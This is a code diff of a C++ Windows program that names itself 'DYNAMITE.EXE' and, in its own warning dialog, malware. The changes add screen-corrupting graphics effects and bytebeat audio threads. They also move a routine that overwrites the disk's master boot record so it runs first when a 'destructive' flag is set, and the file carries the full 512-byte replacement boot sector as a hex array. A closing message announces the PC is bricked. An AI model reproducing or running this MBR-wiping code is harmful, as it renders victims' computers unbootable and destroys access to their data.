@@ -6,8 +6,9 @@
 #include <mmsystem.h>
 #include <random>
 #include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
+
+
+#pragma comment(lib, "winmm.lib")
 
 
 #define _USE_MATH_DEFINES
@@ -17,8 +18,7 @@ extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParam
 	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
 
 
-
-/* ROTATING CUBE STUFF (it was hard)*/
+/* ROTATING CUBE STUFF */
 
 int SCREEN_WIDTH = 1920;
 int SCREEN_HEIGHT = 1080;
@@ -174,7 +174,6 @@ void DrawCube(HDC hdc, const Cube& cube) {
 	}
 	DeleteObject(hPen);
 }
-
 
 /* MISC */
 VOID WINAPI ci(int x, int y, int w, int h)
@@ -375,14 +374,15 @@ const unsigned char MasterBootRecord[] = {
 0xEB, 0x00, 0xE8, 0x35, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x58, 0x7C, 0xB9, 0x00, 0x00, 0xE8, 0x0E, 0x00, 0xE8, 0x34, 0x00, 0x41, 0x83, 0xF9, 0x28, 0x75, 0x03, 0xB9, 0x00, 0x00, 0xEB, 0xF2, 0x50, 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x06, 0x00, 0x46, 0xEB, 0xF4, 0x58, 0xEB, 0xFE, 0xB4, 0x0E, 0xB7, 0x00, 0xB3, 0x04, 0xCD, 0x10, 0xC3, 0xB4, 0x06, 0xB0, 0x00, 0xB7, 0x07, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x00, 0xB9, 0x01, 0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x4B, 0x41, 0x42, 0x4F, 0x4F, 0x4D, 0x21, 0x20, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x50, 0x43, 0x20, 0x6A, 0x75, 0x73, 0x74, 0x20, 0x65, 0x78, 0x70, 0x6C, 0x6F, 0x64, 0x65, 0x64, 0x20, 0x64, 0x75, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x44, 0x79, 0x6E, 0x61, 0x6D, 0x69, 0x74, 0x65, 0x2E, 0x65, 0x78, 0x65, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
 };
 
+
 /* SOUND */
 VOID WINAPI sound1() {
 	HWAVEOUT hWaveOut = 0;
-	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 127] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>(t * (0x21CA52CA >> (t >> 9 & 30) & 14) + t * (0xCACACACA >> (t >> 9 & 30) & 14) & t >> 4);
+		buffer[t] = static_cast<char>(t >> 4) | (t << 3) & (t >> 8);
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -480,7 +480,7 @@ VOID WINAPI sound8() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[16000 * 60] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 8)) & 128);
+		buffer[t] = static_cast<char>(t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64);
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -536,7 +536,7 @@ VOID WINAPI sound12() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 127] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>((t >> 3 | t << 1) + (t >> 13 | t << 55 | t >> 33) | t >> 1 | t << 7);
+		buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (1 + (1 & t >> 12)) >> (3 & t >> 8) | t >> 3);
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -550,7 +550,7 @@ VOID WINAPI sound13() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 127] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>(t * (t >> 7 >> t + t / 2));
+		buffer[t] = static_cast<char>(t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64);
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -564,7 +564,7 @@ VOID WINAPI sound14() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 127] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>(t * ((t >> 1 | t >> 100) & 5) & t << 4);
+		buffer[t] = static_cast<char>(t >> (t % 32 ? 4 : 3) | (t % 128 ? t >> 3 : t >> 3 | t >> 9));
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
@@ -578,13 +578,64 @@ VOID WINAPI sound15() {
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
 	char buffer[8000 * 127] = {};
 	for (DWORD t = 0; t < sizeof(buffer); ++t)
-		buffer[t] = static_cast<char>(t * (t >> 100 * (t >> 15 | t >> 4)));
+		buffer[t] = static_cast<char>(t + (t & t ^ t >> 6) - t * ((t >> 9) & (t % 16 ? 2 : 6) & t >> 9));
 
 	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
 	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
 	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
 	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound16() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 127] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (1 + (5 & t >> 10)) * (3 + (t >> 17 & 1 ? (2 ^ 2 & t >> 14) / 3 : 3 & (t >> 13) + 1)) >> (3 & t >> 9)) & (t & 4096 ? (t * (t ^ t % 9) | t >> 3) >> 1 : 255);
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound17() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64);
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound18	() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 40000, 40000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+
+	const DWORD bufferSize = 40000 * 25;  // Buffer size for a longer duration
+	const DWORD sampleSize = sizeof(char);
+
+	// Adjust buffer size to be a multiple of the sample size
+	const DWORD adjustedBufferSize = bufferSize - (bufferSize % sampleSize);
+	char* buffer = new char[adjustedBufferSize];
+
+	for (DWORD t = 0; t < adjustedBufferSize; ++t)
+		buffer[t] = static_cast<char>((t & t / 2 & t / 4) * t / 4E3);
+
+	WAVEHDR header = { buffer, adjustedBufferSize, 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+
+	delete[] buffer; // Deallocate the buffer
 }
 
 /* SHADERS */
@@ -707,6 +758,7 @@ DWORD WINAPI shader5(LPVOID lpParam) {
 			rgbScreen[i].b = GetBValue(Hue(239));
 		}
 		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		
 		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
 	}
 }
@@ -758,7 +810,7 @@ DWORD WINAPI shapes(LPVOID lpParam) {
 		{
 			ci(x - i / 2, y - i / 2, i, i);
 			
-			Sleep(10);
+			Sleep(100);
 		}
 
 	}
@@ -832,7 +884,7 @@ DWORD WINAPI rev_tunnel(LPVOID lpvd)
 DWORD WINAPI text(LPVOID lpvd)
 {
 	HDC hdc = GetDC(0);
-	Rectangle(hdc, 0,0, SCREEN_WIDTH, SCREEN_HEIGHT);
+	Rectangle(hdc, 0,0, GetSystemMetrics(0), GetSystemMetrics(1));
 	InvalidateRect(0, 0, 0);
 	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
 	LPCSTR text = 0;
@@ -1062,37 +1114,37 @@ DWORD WINAPI KABOOM(LPVOID lpParam)
 
 	InvalidateRect(0, 0, 0);
 	sound5();
-	Sleep(5000);
-	
-	Sleep(5000);
 	
 	
+		sound18();
 		/* SHAPES */
 		HANDLE thread1 = CreateThread(0, 0, shapes, 0, 0, 0);
-		sound1();
+		
 		/* Pan Screen */
 		HANDLE thread3 = CreateThread(0, 0, PanScreen, 0, 0, 0);
-		sound3();
+		
 		/* Reverse Tunnel */
 		//HANDLE thread5 = CreateThread(0, 0, rev_tunnel, 0, 0, 0);
-		sound5();
+		
 		/* Text */
 		HANDLE thread6 = CreateThread(0, 0, text, 0, 0, 0);
-		sound6();
+		
 		/* Gdi hell */
 		//HANDLE thread9 = CreateThread(0, 0, gdihell, 0, 0, 0);
-		sound9();
+		
 		/* Bouncing circles */
 		HANDLE thread10 = CreateThread(0, 0, bouncing_circles, 0, 0, 0);
-		sound10();
+		
 		/* Invert */
 		HANDLE thread11 = CreateThread(0, 0, Invert, 0, 0, 0);
-		sound11();
-	
 		
 	
+		/* SHADER 3*/
+		HANDLE t_shader3 = CreateThread(0, 0, shader3, 0, 0, 0);
+		
+		
 
-		Sleep(127000);
+		Sleep(26000);
 		
 		//TerminateThread(thread9, 0);
 		//CloseHandle(thread9);
@@ -1108,7 +1160,77 @@ DWORD WINAPI KABOOM(LPVOID lpParam)
 		CloseHandle(thread1);
 		TerminateThread(thread11, 0);
 		CloseHandle(thread11);
-		
+		TerminateThread(t_shader3, 0);
+		CloseHandle(t_shader3);
+
+	return 0;
+}
+DWORD WINAPI juliaSet(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+
+	// Variables for fractal pattern
+	const double minX = -2.0;
+	const double maxX = 2.0;
+	const double minY = -2.0;
+	const double maxY = 2.0;
+	const int maxIterations = 20;
+
+	// Julia set parameters
+	const double cReal = -0.8; // Real part of the constant c
+	const double cImaginary = 0.156; // Imaginary part of the constant c
+
+	// Variable for animating the Julia set
+	double animationVariable = 0.0;
+
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+
+			// Convert screen coordinates to fractal coordinates
+			double a = minX + (maxX - minX) * x / w;
+			double b = minY + (maxY - minY) * y / h;
+
+			// Julia set iteration
+			int n;
+			for (n = 0; n < maxIterations; n++) {
+				double aa = a * a - b * b;
+				double bb = 2 * a * b;
+				a = aa + cReal + std::sin(animationVariable);
+				b = bb + cImaginary + std::cos(animationVariable);
+				if (a * a + b * b > 4.0) {
+					break;
+				}
+			}
+
+			// Map the iteration count to a color value
+			double t = static_cast<double>(n) / maxIterations;
+			COLORREF color1 = RGB(0, 0, 0);
+			COLORREF color2 = RGB(255, 255, 255);
+			COLORREF color = interpolateColors(color1, color2, t);
+
+			rgbScreen[i].rgb = color;
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		ReleaseDC(NULL, hdcScreen);
+		DeleteDC(hdcScreen);
+
+		// Animate the Julia set using a variable
+		animationVariable += 0.1;
+
+		Sleep(10); // Add a small delay for smoother animation
+	}
 
 	return 0;
 }
@@ -1122,9 +1244,41 @@ DWORD WINAPI MBR() {
 	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0); //Write the file to the handle
 	CloseHandle(hDevice); // close the handle function
 
-	MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"Your PC is now bricked! Use it as long as you can!\nAfter the next reboot you won't be able to log in to windows anymore! Have fun :)", L"DYNAMITE.EXE", MB_OK | MB_ICONWARNING);
 	return 0;
 }
+DWORD WINAPI stretch(LPVOID lpParam) {
+	while (1) {
+		HDC hdc = GetDC(0);
+		HDC hdcMem = CreateCompatibleDC(hdc);
+		int sw = GetSystemMetrics(0);
+		int sh = GetSystemMetrics(1);
+		HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
+		SelectObject(hdcMem, bm);
+		RECT rect;
+		GetWindowRect(GetDesktopWindow(), &rect);
+		POINT pt[3];
+		int inc3 = rand() % 700;
+		int v = rand() % 2;
+		if (v == 1) inc3 = -700;
+		inc3++;
+		pt[0].x = rect.left - inc3;
+		pt[0].y = rect.top + inc3;
+		pt[1].x = rect.right - inc3;
+		pt[1].y = rect.top - inc3;
+		pt[2].x = rect.left + inc3;
+		pt[2].y = rect.bottom - inc3;
+		PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
+		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
+		BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
+		DeleteObject(hdcMem); DeleteObject(bm);
+		ReleaseDC(0, hdc);
+		Sleep(1);
+	}
+	}
+
+
+
+
 
 
 INT main() {
@@ -1140,12 +1294,17 @@ INT main() {
 	}
 
 	
-	
+
 		if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"THIS IS MALWARE, THAT WILL MAKE YOUR DEVICE UNUSABLE! (If you haven't chosen gdi-only mode)\nARE YOU SURE IF YOU WANT TO EXECUTE THIS PROGRAM?", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
 		{
 			if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"LAST WARNING! DO YOU WANT TO RUN THIS PROGRAM?\nALL YOUR DATA WILL BE LOST!\nYOU WILL NOT BE ABLE TO USE YOUR PC AGAIN!\n(If you haven't chosen gdi-only mode)", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
 			{
-
+				
+				/* MBR */
+				if (destructive == true)
+				{
+					MBR();
+				}
 				/* SHADER 1 */
 				HANDLE t_shader1 = CreateThread(0, 0, shader1, 0, 0, 0);
 				sound11();
@@ -1223,6 +1382,14 @@ INT main() {
 				TerminateThread(thread6, 0);
 				CloseHandle(thread6);
 
+				/* STRETCH */
+				
+				HANDLE t_staticbox = CreateThread(0, 0, stretch, 0, 0, 0);
+				sound16();
+				Sleep(20000);
+				TerminateThread(t_staticbox, 0);
+				CloseHandle(t_staticbox);
+
 				/* Mandelbrot! */
 				HANDLE thread7 = CreateThread(0, 0, mandelbrot, 0, 0, 0);
 				sound7();
@@ -1261,6 +1428,13 @@ INT main() {
 				TerminateThread(t_shader5, 0);
 				CloseHandle(t_shader5);
 
+				/* JULIA SET */
+				HANDLE t_ship = CreateThread(0, 0, juliaSet, 0, 0, 0);
+				sound17();
+				Sleep(20000);
+				TerminateThread(t_ship, 0);
+				CloseHandle(t_ship);
+
 				/* Bouncing circles */
 				HANDLE thread10 = CreateThread(0, 0, bouncing_circles, 0, 0, 0);
 				sound10();
@@ -1272,27 +1446,17 @@ INT main() {
 
 				/* KABOOM */
 				HANDLE thread11 = CreateThread(0, 0, KABOOM, 0, 0, 0);
-				Sleep(200000);
+				Sleep(26000);
 
 				TerminateThread(thread11, 0);
 				CloseHandle(thread11);
 
-				/* MBR */
-				if (destructive == true)
-				{
-					MBR();
+				MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"Your PC is now bricked! Use it as long as you can!\nAfter the next reboot you won't be able to log in to windows anymore! Have fun :)", L"DYNAMITE.EXE", MB_OK | MB_ICONWARNING);
 
-				}
 			}
-			else
-			{
-				return 0;
-			}
+			
 		}
-		else
-		{
-			return 0;
-		}
+		
 		
 	
 	
